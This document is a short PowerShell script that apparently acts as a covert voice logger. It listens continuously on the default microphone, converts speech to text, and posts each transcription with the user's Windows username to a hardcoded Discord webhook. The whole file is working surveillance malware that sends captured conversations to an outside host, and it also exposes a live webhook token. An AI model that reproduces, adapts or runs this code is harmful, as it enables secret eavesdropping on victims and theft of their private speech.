function DC-Upload {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$text
    )

    $dc = 'https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY'
    $Body = @{
        'username' = $env:USERNAME
        'content'  = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))) {
        try {
            Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
            Start-Sleep -Milliseconds 500 # Delay after sending message
        }
        catch {
            Write-Error "Failed to send message: $_"
        }
    }
}

function voiceLogger {
    Add-Type -AssemblyName System.Speech
    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $recognizer.LoadGrammar($grammar)
    $recognizer.SetInputToDefaultAudioDevice()

    # Initialization delay
    Start-Sleep -Seconds 2

    while ($true) {
        try {
            $result = $recognizer.Recognize()
            if ($result) {
                $text = $result.Text
                DC-Upload -text $text
                Start-Sleep -Milliseconds 300 # Delay between utterances
            }
            Start-Sleep -Milliseconds 100 # Loop delay
        }
        catch {
            Write-Error "Recognition error: $_"
            Start-Sleep -Seconds 1
        }
    }
}

# Start the logger
voiceLogger
